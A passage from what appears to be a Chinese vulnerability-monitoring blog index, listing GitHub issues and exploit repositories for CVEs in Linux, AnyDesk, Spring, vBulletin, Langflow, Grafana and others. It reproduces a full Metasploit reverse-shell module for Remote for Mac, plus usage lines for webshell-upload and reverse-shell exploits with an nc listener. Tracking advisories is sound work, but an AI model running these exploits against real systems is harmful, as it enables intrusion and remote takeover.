`http.component:&quot;roundcube&quot;`&gt; Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(`-debug`) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. &gt; Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.You can check the FAQ for the Nuclei Templates Community Rewards Program [here](https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md).","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"projectdiscovery/nuclei-templates:github issues","slug":"projectdiscovery-nuclei-templates-github-issues","permalink":"http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"},{"name":"命令执行","slug":"命令执行","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CVE-2020-12641","slug":"CVE-2020-12641","permalink":"http://example.com/tags/CVE-2020-12641/"}]},{"title":"Linux 权限提升漏洞 (OtterRoot)","slug":"github_2088529382","date":"2025-06-01T13:17:30.046Z","updated":"2025-06-01T13:17:30.042Z","comments":true,"path":"2025/06/01/github_2088529382/","permalink":"http://example.com/2025/06/01/github_2088529382/","excerpt":"","text":"漏洞名称： Linux 权限提升漏洞 (OtterRoot) 漏洞编号： CVE： CVE-2024-26809 漏洞类型： 权限提升 漏洞等级： 高危 漏洞描述： Linux系统中存在一个权限提升漏洞（CVE-2024-26809），被称为OtterRoot。该漏洞允许攻击者在受影响的系统上提升权限。漏洞利用代码自包含于一个单一的exploit.c文件中，具有极高的可移植性。 产品名称： Linux 来源： https://github.com/rapid7/metasploit-framework/issues/19863 类型： rapid7&#x2F;metasploit-framework:github issues 1234567891011121314151617181920212223&lt;!-- To make it easier for us to help you, please include as much useful information as possible. Useful Links: - Wiki: https://docs.metasploit.com/ Before opening a new issue, please search existing issues https://github.com/rapid7/metasploit-framework/issues--&gt;## SummaryOffset-less Linux LPE (CVE-2024-26809)### Basic example![Image](https://github.com/user-attachments/assets/f77f9608-d343-4039-80a8-51fb1bd64716)- https://osec.io/blog/2024-11-25-netfilter-universal-root-1-day/- https://github.com/otter-sec/OtterRoot/tree/master### MotivationSelf-contained (a single exploit.c file) ultra-portable Linux exploit.","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"rapid7/metasploit-framework:github issues","slug":"rapid7-metasploit-framework-github-issues","permalink":"http://example.com/tags/rapid7-metasploit-framework-github-issues/"},{"name":"CVE-2024-26809","slug":"CVE-2024-26809","permalink":"http://example.com/tags/CVE-2024-26809/"},{"name":"权限提升","slug":"权限提升","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"}]},{"title":"AnyDesk 远程代码执行漏洞","slug":"github_1507688631","date":"2025-06-01T13:17:19.040Z","updated":"2025-06-01T13:17:19.038Z","comments":true,"path":"2025/06/01/github_1507688631/","permalink":"http://example.com/2025/06/01/github_1507688631/","excerpt":"","text":"漏洞名称： AnyDesk 远程代码执行漏洞 漏洞编号： CVE： CVE-2020-13160 漏洞类型： 命令执行 漏洞等级： 高危 漏洞描述： AnyDesk远程访问软件存在远程代码执行（RCE）漏洞，允许攻击者在目标系统上执行恶意代码。CVE-2020-13160突出了在5.5.2版本之前的DLL劫持缺陷，使得未经授权的系统访问成为可能。此外，认证绕过风险允许攻击者跳过登录要求，而DLL注入则允许恶意库运行。不安全的权限管理可能授予用户过多的权限。剪贴板数据泄露暴露了敏感复制的信息，网络扫描漏洞揭示了系统信息。 产品厂商： AnyDesk 产品名称： AnyDesk 影响版本： version &lt; 5.5.2 来源： https://github.com/Quelvara/Anydesk-Exploit-CVE-2025-12654-RCE-Builder 类型： CVE-2025:github search 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;p align=&quot;center&quot;&gt; &lt;a href=&quot;http://www.theunwindai.com&quot;&gt; &lt;img src=&quot;https://github.com/user-attachments/assets/fe95e86b-926a-45e1-bb58-741b34bf76a0&quot; width=&quot;900&quot; height=&quot;400&quot; alt=&quot;Unwind AI&quot;&gt; &lt;/a&gt;&lt;/p&gt;&lt;div align=&quot;center&quot;&gt;&lt;a href=&quot;z&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/VB.NET-512BD4?style=for-the-badge&amp;logo=dotnet&amp;logoColor=white&quot;/&gt;&lt;/a&gt;&lt;a href=&quot;z&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&amp;logo=visual%20studio&amp;logoColor=white&quot;/&gt;&lt;/a&gt;&lt;a href=&quot;z&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&amp;logo=visual%20studio%20code&amp;logoColor=white&quot;/&gt;&lt;/a&gt;&lt;/div&gt;# AnyDesk ExploitAnyDesk, remote access software, has faced security concerns like RCE (Remote Code Execution), allowing attackers to execute malicious code on target systems. CVE-2020-13160 highlights a DLL hijacking flaw in versions prior to 5.5.2, enabling unauthorized system access. Authentication bypass risks let attackers skip login requirements, while DLL injection allows malicious libraries to run. Insecure permission management may grant excessive user privileges. Clipboard data leakage exposes sensitive copied content, and network scanning vulnerabilities reveal system info.## Features* 1. RCE (Remote Code Execution)* 2. CVE-2020-13160* 3. Authentication Bypass* 4. DLL Injection* 5. Insecure Permission Management* 6. CVE-2019-14743* 7. Unauthorized Audio Chat Access* 8. Clipboard Data Leakage* 9. Network Scanning Vulnerability* 10. Version Check Bypass### Requirements - Visual Studio 2022- .NET Framework must be installed. ![133](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)### Compilation- Download the project to your computer- Extract the project to a Folder.- Open Solution File- Select **Build Solution** from the **Build** menu. - ![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)- Find Executable File./bin/Debug/## Preview![photo_2025-04-02_20-19-43](https://github.com/user-attachments/assets/fc7ae72d-9e99-4155-b170-9e2a30ec1ba4)https://github.com/user-attachments/assets/a50bb11e-bd9c-44c3-a459-4ddd0a6a9932## Contributing**⭐ Star this repository if you find it useful!**## Disclaimer**This content is provided for learning and testing purposes only. The information presented is for general information purposes and does not address any specific situation.**## LicenceProject is licenced under the [MIT licence](https://github.com/AvaloniaUI/Avalonia/blob/master/licence.md). - .github- AnyDesk- AnyDesk Exploit.sln- AnyDesk Exploit- LICENSE- README.md- SECURITY.md```","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"命令执行","slug":"命令执行","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CVE-2025:github search","slug":"CVE-2025-github-search","permalink":"http://example.com/tags/CVE-2025-github-search/"},{"name":"CVE-2020-13160","slug":"CVE-2020-13160","permalink":"http://example.com/tags/CVE-2020-13160/"}]},{"title":"Spring Data REST & Boot 任意代码执行漏洞","slug":"github_2129592255","date":"2025-06-01T13:17:04.996Z","updated":"2025-06-01T13:17:04.994Z","comments":true,"path":"2025/06/01/github_2129592255/","permalink":"http://example.com/2025/06/01/github_2129592255/","excerpt":"","text":"漏洞名称： Spring Data REST &amp; Boot 任意代码执行漏洞 漏洞编号： CVE： CVE-2017-8046 漏洞类型： 反序列化 漏洞等级： 严重 漏洞描述： Spring Data REST &lt; 2.6.9和3.0.1，Spring Boot &lt; 1.5.9和2.0 M6版本中存在远程代码执行漏洞，攻击者可以通过发送恶意的PATCH请求，利用精心构造的JSON数据执行任意Java代码。 产品厂商： Spring 产品名称： Spring Data REST, Spring Boot 影响版本： Spring Data REST &lt; 2.6.9 and 3.0.1, Spring Boot &lt; 1.5.9 and 2.0 M6 搜索语法： http.title:”eureka” 来源： https://github.com/projectdiscovery/nuclei-templates/issues/12202 类型： projectdiscovery&#x2F;nuclei-templates:github issues 12345678910111213141516171819202122232425262728293031### Description: &gt; Spring Data REST &lt; 2.6.9 and 3.0.1, Spring Boot &lt; 1.5.9 and 2.0 M6 contain a remote code execution caused by processing malicious PATCH requests with crafted JSON data, letting attackers execute arbitrary Java code, exploit requires sending malicious PATCH requests.#### Severity: `Critical`#### POC: - https://github.com/guanjivip/CVE-2017-8046- https://github.com/jsotiro/VulnerableSpringDataRest- https://github.com/cved-sources/cve-2017-8046- https://vulncheck.com/xdb/a2ab2493c69d- https://github.com/bkhablenko/CVE-2017-8046- https///github.com:bkhablenko/CVE-2017-8046.git- https://github.com/jkutner/spring-break-cve-2017-8046- https://vulncheck.com/xdb/cf4f8c3e40a7- https://github.com/FixYourFace/SpringBreakPoC- https///github.com:FixYourFace/SpringBreakPoC.git- https://github.com/m3ssap0/spring-break_cve-2017-8046- https://github.com/m3ssap0/SpringBreakVulnerableApp- https://github.com/sj/spring-data-rest-CVE-2017-8046- https://github.com/Soontao/CVE-2017-8046-DEMO### KEV: True### Shodan Query: `http.title:&quot;eureka&quot;`&gt; Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(`-debug`) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. &gt; Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.You can check the FAQ for the Nuclei Templates Community Rewards Program [here](https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md).","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"projectdiscovery/nuclei-templates:github issues","slug":"projectdiscovery-nuclei-templates-github-issues","permalink":"http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"},{"name":"CVE-2017-8046","slug":"CVE-2017-8046","permalink":"http://example.com/tags/CVE-2017-8046/"},{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"Vbulletin 远程代码执行漏洞","slug":"github_1417705317","date":"2025-06-01T13:16:52.072Z","updated":"2025-06-01T13:16:52.069Z","comments":true,"path":"2025/06/01/github_1417705317/","permalink":"http://example.com/2025/06/01/github_1417705317/","excerpt":"","text":"漏洞名称： Vbulletin 远程代码执行漏洞 漏洞编号： CVE： CVE-2025-48827 漏洞类型： 命令执行 漏洞等级： 高危 漏洞描述： vBulletin版本5.0.0至5.7.5和6.0.0至6.0.3在使用PHP 8.1时存在远程代码执行漏洞，攻击者可以利用此漏洞上传PHP webshell，从而在服务器上执行任意代码。 产品厂商： vBulletin 产品名称： vBulletin 影响版本： 5.0.0 - 5.7.5, 6.0.0 - 6.0.3 来源： https://github.com/wiseep/CVE-2025-48827 类型： CVE-2025:github search 1234567891011121314151617181920212223242526272829**Description:**RCE for Vbullettin versions between 5.0.0 - 5.7.5 and 6.0.0 - 6.0.3 with PHP 8.1**Futures:**- Multi thread- Read from multiple target from file- Detect vbullettin websites- Checks vulnerabilit, if succes upload a php webshell**Detail of usage:**usage: CVE-2025-48827.py [-h] [--url URL] [--list LIST] [--threads THREADS] [--timeout TIMEOUT]Identify and upload shell on vBulletin targets.optional arguments: -h, --help show this help message and exit --url URL Single target URL --list LIST File with list of targets --threads THREADS Threads to use (default: 5) --timeout TIMEOUT Request timeout in seconds (default: 10) - CVE-2025-48827.py- README.md```","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"命令执行","slug":"命令执行","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CVE-2025-48827","slug":"CVE-2025-48827","permalink":"http://example.com/tags/CVE-2025-48827/"},{"name":"CVE-2025:github search","slug":"CVE-2025-github-search","permalink":"http://example.com/tags/CVE-2025-github-search/"}]},{"title":"Remote for Mac 未授权远程代码执行漏洞","slug":"github_1860810429","date":"2025-06-01T13:16:39.709Z","updated":"2025-06-01T13:16:39.705Z","comments":true,"path":"2025/06/01/github_1860810429/","permalink":"http://example.com/2025/06/01/github_1860810429/","excerpt":"","text":"漏洞名称： Remote for Mac 未授权远程代码执行漏洞 漏洞类型： 未授权访问 漏洞等级： 高危 漏洞描述： 该模块利用了Remote for Mac版本至2025.7（包括补丁版本）中的未授权远程代码执行漏洞，通过&#x2F;api&#x2F;executeScript端点。当目标系统上禁用认证时，攻击者可以执行任意AppleScript命令，包括通过do shell script执行的shell命令。 产品名称： Remote for Mac 影响版本： version &lt;&#x3D; 2025.7 来源： https://github.com/rapid7/metasploit-framework/blob/a21fc34c4d7268d9e14610e8a8a4e429eecf74ed/modules%2Fexploits%2Fosx%2Fhttp%2Fremote_for_mac_rce.rb 类型： rapid7&#x2F;metasploit-framework:github issues require &#39;json&#39; class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::HttpClient prepend Msf::Exploit::Remote::AutoCheck def initialize(info = &#123;&#125;) super( update_info( info, &#39;Name&#39; =&gt; &#39;Remote for Mac &lt;= 2025.7 - Unauthenticated RCE&#39;, &#39;Description&#39; =&gt; %q&#123; This module exploits an unauthenticated remote code execution vulnerability in Remote for Mac versions up to and including 2025.7 via the /api/executeScript endpoint. When authentication is disabled on the target system, it allows attackers to execute arbitrary AppleScript commands, which can include shell commands via `do shell script`. All versions up to 2025.7 (including patch versions) are vulnerable. &#125;, &#39;License&#39; =&gt; MSF_LICENSE, &#39;Author&#39; =&gt; [&#39;Chokri Hammedi (@blue0x1)&#39;], &#39;References&#39; =&gt; [ [&#39;PACKETSTORM&#39;, &#39;195347&#39;] ], &#39;DisclosureDate&#39; =&gt; &#39;2025-05-27&#39;, &#39;Platform&#39; =&gt; [&#39;unix&#39;,&#39;osx&#39;], &#39;Arch&#39; =&gt; ARCH_CMD, &#39;Targets&#39; =&gt; [[&#39;Auto&#39;, &#123;&#125;]], &#39;DefaultTarget&#39; =&gt; 0, &#39;DefaultOptions&#39; =&gt; &#123; &#39;RPORT&#39; =&gt; 49229, &#39;SSL&#39; =&gt; true &#125;, &#39;Notes&#39; =&gt; &#123; &#39;Stability&#39; =&gt; [&#39;CRASH_SAFE&#39;], &#39;Reliability&#39; =&gt; [&#39;REPEATABLE_SESSION&#39;], &#39;SideEffects&#39; =&gt; [&#39;ARTIFACTS_ON_DISK&#39;] &#125; ) ) end def check res = send_request_cgi( &#39;uri&#39; =&gt; normalize_uri(target_uri.path, &#39;api&#39;, &#39;getVersion&#39;), &#39;method&#39; =&gt; &#39;GET&#39; ) return CheckCode::Unknown(&#39;No response from target&#39;) unless res&amp;.code == 200 info = res.get_json_document if info.empty? return CheckCode::Unknown(&#39;Unable to parse JSON from /api/getVersion&#39;) end if info.dig(&#39;requires.auth&#39;) == true return CheckCode::Safe(&#39;Target requires authentication on /api/executeScript&#39;) end version = info.dig(&#39;version&#39;).to_s if version.empty? return CheckCode::Unknown(&#39;Could not determine target version&#39;) end begin target_version = Rex::Version.new(version) vulnerable_version = Rex::Version.new(&#39;2025.7&#39;) if target_version &lt;= vulnerable_version return CheckCode::Appears else return CheckCode::Safe(&quot;Target version #&#123;version&#125; is not vulnerable&quot;) end rescue ArgumentError return CheckCode::Unknown(&quot;Invalid version format: #&#123;version&#125;&quot;) end end def exploit print_status(&quot;Generating reverse shell payload for #&#123;datastore[&#39;LHOST&#39;]&#125;:#&#123;datastore[&#39;LPORT&#39;]&#125;&quot;) cmd = payload.encoded applescript = %(do shell script &quot;#&#123;cmd&#125;&quot;) host_name = Rex::Text.rand_text_alpha(8) host_model = &quot;#&#123;Rex::Text.rand_text_alpha(4)&#125;#&#123;rand(99)&#125;&quot; script_name = Rex::Text.rand_text_alpha(8) print_status(&quot;Sending exploit to #&#123;rhost&#125;:#&#123;rport&#125; via AppleScript&quot;) res = send_request_cgi( &#39;uri&#39; =&gt; normalize_uri(target_uri.path, &#39;api&#39;, &#39;executeScript&#39;), &#39;method&#39; =&gt; &#39;GET&#39;, &#39;headers&#39; =&gt; &#123; &#39;X-ClientToken&#39; =&gt; Rex::Text.rand_text_numeric(4), &#39;X-HostName&#39; =&gt; host_name, &#39;X-HostFullModel&#39; =&gt; host_model, &#39;X-Script&#39; =&gt; applescript, &#39;X-ScriptName&#39; =&gt; script_name, &#39;X-ScriptDelay&#39; =&gt; &#39;0&#39; &#125; ) if res&amp;.code == 200 print_good(&#39;Payload delivered successfully. Awaiting session...&#39;) else fail_with(Failure::UnexpectedReply, &quot;Unexpected HTTP response: #&#123;res&amp;.code || &#39;no response&#39; &#125;&quot;) end end end```","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"未授权访问","slug":"未授权访问","permalink":"http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"rapid7/metasploit-framework:github issues","slug":"rapid7-metasploit-framework-github-issues","permalink":"http://example.com/tags/rapid7-metasploit-framework-github-issues/"}]},{"title":"Langflow 远程代码执行漏洞","slug":"github_4139753060","date":"2025-06-01T13:16:28.449Z","updated":"2025-06-01T13:16:28.445Z","comments":true,"path":"2025/06/01/github_4139753060/","permalink":"http://example.com/2025/06/01/github_4139753060/","excerpt":"","text":"漏洞名称： Langflow 远程代码执行漏洞 漏洞编号： CVE： CVE-2025-3248 漏洞类型： 命令执行 漏洞等级： 高危 漏洞描述： 此Python脚本利用CVE-2025-3248漏洞在易受攻击的系统上执行任意命令或生成反向shell。使用此漏洞需要认证。 产品名称： Langflow 来源： https://github.com/tiemio/RCE-CVE-2025-3248 类型： CVE-2025:github search 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103# Authenticated CVE-2025-3248 Langflow Remote Code ExecutionThis Python script exploits **CVE-2025-3248** to execute arbitrary commands or spawn a reverse shell on a vulnerable system.**Authentication is required** to use this exploit.---## Features- **Authenticated Command Execution:** Run arbitrary system commands on the target.- **Reverse Shell:** Spawn a reverse shell to your listener.- **Proxy Support:** Route requests through a proxy (e.g., Burp Suite).---## Requirements- Python 3.x- `requests` libraryInstall dependencies with:bashpip install requests---## Usagebashpython3 exploit.py -u &lt;TARGET_URL&gt; -l &lt;USERNAME&gt; -p &lt;PASSWORD&gt; [-c &lt;COMMAND&gt;] [--proxy &lt;PROXY&gt;] [--lhost &lt;LHOST&gt; --lport &lt;LPORT&gt;]### Arguments| Argument | Description | Required ||------------------|--------------------------------------------------|----------|| `-u`, `--url` | Target base URL (e.g., `https://target.com`) | Yes || `-l`, `--login` | Admin username | Yes || `-p`, `--password` | Admin password | Yes || `-c`, `--command`| Command to execute on the target | No* || `--proxy` | Proxy URL (e.g., `http://127.0.0.1:8080`) | No || `--lhost` | Local host for reverse shell | No* || `--lport` | Local port for reverse shell | No* |\\* You must specify either a command (`-c`) or both `--lhost` and `--lport` for a reverse shell.---### Examples#### 1. Execute a Commandbashpython3 exploit.py -u https://target.com -l admin -p password -c &quot;id&quot;#### 2. Get a Reverse ShellStart a listener on your machine:bashnc -lvnp 4444Then run:bashpython3 exploit.py -u https://target.com -l admin -p password --lhost YOUR_IP --lport 4444#### 3. Use a Proxybashpython3 exploit.py -u https://target.com -l admin -p password -c &quot;whoami&quot; --proxy http://127.0.0.1:8080---## Docker image### Deploying the imageYou can deploy the Docker image using the following command:bashpodman compose up -dThe image will be available at `http://localhost:7860`.Credits for the compose file: [This repository](https://github.com/vulhub/vulhub/tree/master/langflow/CVE-2025-3248)---## DisclaimerThis script is for **educational and authorized penetration testing** purposes only.**Do not use against systems you do not own or have explicit permission to test.**---This readme is AI generated. - .gitignore- README.md- docker- exploit.py```","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"命令执行","slug":"命令执行","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CVE-2025:github search","slug":"CVE-2025-github-search","permalink":"http://example.com/tags/CVE-2025-github-search/"},{"name":"CVE-2025-3248","slug":"CVE-2025-3248","permalink":"http://example.com/tags/CVE-2025-3248/"}]},{"title":"Metasploit remove_host module Whitespace Parsing Vulnerability","slug":"github_3373261989","date":"2025-06-01T13:16:18.308Z","updated":"2025-06-01T13:16:18.305Z","comments":true,"path":"2025/06/01/github_3373261989/","permalink":"http://example.com/2025/06/01/github_3373261989/","excerpt":"","text":"漏洞名称： Metasploit remove_host module Whitespace Parsing Vulnerability 漏洞类型： 配置问题 漏洞等级： 中危 漏洞描述： Metasploit Framework中的post/windows/manage/remove_host模块在处理主机文件记录时，错误地假设所有记录都使用制表符(\\t)来分隔主机和IP地址。实际上，空格(0x20)等多种空白字符也可以作为分隔符。此外，模块未考虑记录后可能存在的内联注释(#)或尾随空白，这导致模块无法正确处理某些格式的主机记录。此问题可能导致模块错误地移除或未能移除特定的主机记录。 产品厂商： Rapid7 产品名称： Metasploit Framework 来源： https://github.com/rapid7/metasploit-framework/issues/20157 类型： rapid7&#x2F;metasploit-framework:github issues 1234567891011121314151617181920212223242526The `post/windows/manage/remove_host` module presumes that all records in the host file use tab (`\\t`) to separate the host and IP address.https://github.com/rapid7/metasploit-framework/blob/b5129fe19874e74d5a103bb9d1372fb30f618b32/modules/post/windows/manage/remove_host.rb#L61-L65This is an unsafe assumption, as space (`0x20`) (and likely many other forms of whitespace) can be used as a separator. The default sample `hosts` file on Windows offers the following guidance:# This file contains the mappings of IP addresses to host names. Each# entry should be kept on an individual line. The IP address should# be placed in the first column followed by the corresponding host name.# The IP address and the host name should be separated by at least one# space.Furthermore, host records can be followed by an inline comment (`#`) or trailing whitespace, which the module fails to take into account as the `$` end-of-line regex symbol is used.As a result, this module will fail to remove host records such as the following:127.0.0.1 asdf 127.0.0.1 asdf127.0.0.1 asdf # commentFinally, as the module uses regex matching, the module may incorrectly remove hosts (although unlikely) if the specified `DOMAIN` contains an unfortunately placed regex wildcard character (`.`). For example, `set DOMAIN shop.ebay.com` will remove host records such as `shop4ebay.com` - a completely different domain (I can&#x27;t think of a better example).","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"rapid7/metasploit-framework:github issues","slug":"rapid7-metasploit-framework-github-issues","permalink":"http://example.com/tags/rapid7-metasploit-framework-github-issues/"},{"name":"配置问题","slug":"配置问题","permalink":"http://example.com/tags/%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/"}]},{"title":"Microsoft .NET Framework 远程代码执行漏洞","slug":"github_1314524899","date":"2025-06-01T13:16:04.542Z","updated":"2025-06-01T13:16:04.536Z","comments":true,"path":"2025/06/01/github_1314524899/","permalink":"http://example.com/2025/06/01/github_1314524899/","excerpt":"","text":"漏洞名称： Microsoft .NET Framework 远程代码执行漏洞 漏洞编号： CVE： CVE-2020-0646 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： Microsoft .NET Framework 存在一个由于输入验证不当导致的远程代码执行漏洞，允许远程攻击者通过向系统发送恶意输入来执行任意代码。 产品厂商： Microsoft 产品名称： .NET Framework 搜索语法： server: ms .net remoting 来源： https://github.com/projectdiscovery/nuclei-templates/issues/12210 类型： projectdiscovery&#x2F;nuclei-templates:github issues 123456789101112131415161718### Description: &gt; Microsoft .NET Framework contains a remote code execution caused by improper input validation, letting remote attackers execute arbitrary code, exploit requires sending malicious input to the system.#### Severity: `Critical`#### POC: - http://packetstormsecurity.com/files/156930/SharePoint-Workflows-XOML-Injection.html### KEV: True### Shodan Query: `server: ms .net remoting`&gt; Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(`-debug`) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. &gt; Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.You can check the FAQ for the Nuclei Templates Community Rewards Program [here](https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md).","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"projectdiscovery/nuclei-templates:github issues","slug":"projectdiscovery-nuclei-templates-github-issues","permalink":"http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"},{"name":"命令执行","slug":"命令执行","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CVE-2020-0646","slug":"CVE-2020-0646","permalink":"http://example.com/tags/CVE-2020-0646/"}]},{"title":"Grafana 未授权访问漏洞","slug":"github_1376329874","date":"2025-06-01T13:15:54.208Z","updated":"2025-06-01T13:15:54.204Z","comments":true,"path":"2025/06/01/github_1376329874/","permalink":"http://example.com/2025/06/01/github_1376329874/","excerpt":"","text":"漏洞名称： Grafana 未授权访问漏洞 漏洞编号： CVE： CVE-2024-9264 漏洞类型： 未授权访问 漏洞描述： 一个影响Grafana版本11.0.x、11.1.x和11.2.x的未授权访问漏洞的Go语言实现。 产品厂商： Grafana 产品名称： Grafana 影响版本： 11.0.x, 11.1.x, 11.2.x 来源： https://github.com/Cythonic1/CVE-2024-9264 类型： CVE-2024:github search 1234``` go.mod- main.go&#96;&#96;&#96;","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"CVE-2024:github search","slug":"CVE-2024-github-search","permalink":"http://example.com/tags/CVE-2024-github-search/"},{"name":"CVE-2024-9264","slug":"CVE-2024-9264","permalink":"http://example.com/tags/CVE-2024-9264/"},{"name":"未授权访问","slug":"未授权访问","permalink":"http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"}]},{"title":"Web Applications Command Injection via Multipart Form Upload Vulnerability","slug":"github_3089224116","date":"2025-06-01T13:15:41.393Z","updated":"2025-06-01T13:15:41.392Z","comments":true,"path":"2025/06/01/github_3089224116/","permalink":"http://example.com/2025/06/01/github_3089224116/","excerpt":"","text":"漏洞名称： Web Applications Command Injection via Multipart Form Upload Vulnerability 漏洞编号： CVE： CVE-2025-27590 漏洞类型： 命令执行 漏洞等级： 高危 漏洞描述： CVE-2025-27590是一个命令注入漏洞，影响处理多部分文件上传的Web应用程序。攻击者通过构造恶意的form-data载荷，可以在没有适当清理的情况下执行任意shell命令，包括SSH密钥注入。漏洞类型为命令执行，攻击向量为HTTP multipart/form-data，影响的参数为cloginrc和file1表单部分。 产品名称： Web Applications Processing Multipart File Uploads 来源： https://github.com/fatkz/CVE-2025-27590 类型： CVE-2025:github search 123456789101112131415161718192021222324# CVE-2025-27590 - PoC Exploit (Command Injection via Multipart Form Upload)## 📌 DescriptionThis is a Proof-of-Concept (PoC) exploit for **CVE-2025-27590**, a command injection vulnerability affecting web applications that process multipart file uploads without proper sanitization. The vulnerability allows remote attackers to execute arbitrary shell commands by crafting malicious form-data payloads.---## 🧠 Vulnerability Summary- **Type**: Command Injection- **Vector**: HTTP `multipart/form-data`- **Affected Parameter**: `cloginrc` and `file1` form parts- **Impact**: Arbitrary shell command execution, including SSH key injection---## 🚀 Usagepython3 exploit_cve_2025_27590.py -u &lt;TARGET_IP_OR_DOMAIN&gt; -p &lt;PORT&gt; -l &lt;PATH_TO_WRITE&gt;python3 exploit_cve_2025_27590.py -u 172.20.221.195 -p 8888 -l /home/oxidized/.bashrc - README.md- exploit.py```","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"命令执行","slug":"命令执行","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CVE-2025:github search","slug":"CVE-2025-github-search","permalink":"http://example.com/tags/CVE-2025-github-search/"},{"name":"CVE-2025-27590","slug":"CVE-2025-27590","permalink":"http://example.com/tags/CVE-2025-27590/"}]},{"title":"Spring Data REST PATCH Request Remote Code Execution Vulnerability","slug":"github_1822799483","date":"2025-06-01T13:15:28.830Z","updated":"2025-06-01T13:15:28.828Z","comments":true,"path":"2025/06/01/github_1822799483/","permalink":"http://example.com/2025/06/01/github_1822799483/","excerpt":"","text":"漏洞名称： Spring Data REST PATCH Request Remote Code Execution Vulnerability 漏洞编号： CVE： CVE-2017-8046 漏洞类型： 远程代码执行 漏洞等级： 严重 漏洞描述： Spring Data REST &lt; 2.6.9和3.0.1，Spring Boot &lt; 1.5.9和2.0 M6存在远程代码执行漏洞，攻击者可以通过发送恶意的PATCH请求，利用特制的JSON数据执行任意Java代码。 